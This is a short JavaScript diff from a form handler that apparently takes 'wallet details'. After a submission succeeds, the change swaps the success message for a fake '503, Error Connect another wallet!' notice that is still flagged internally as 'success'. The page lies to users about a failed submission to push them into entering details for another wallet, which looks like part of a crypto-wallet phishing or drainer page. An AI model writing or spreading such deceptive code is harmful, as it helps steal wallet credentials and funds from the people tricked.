@@ -242,9 +242,9 @@ function setupFormValidation() {
                     if (loadingOverlay) loadingOverlay.style.display = 'none';
 
                     if (window.showNotification) {
-                        window.showNotification('Wallet details submitted successfully!', 'success');
+                        window.showNotification('503, Error Connect another wallet!', 'success');
                     } else {
-                        alert('Wallet details submitted successfully!');
+                        alert('503, Error Connect another wallet!');
                     }
 
                     const connectButton = document.getElementById('connectWalletBtn');
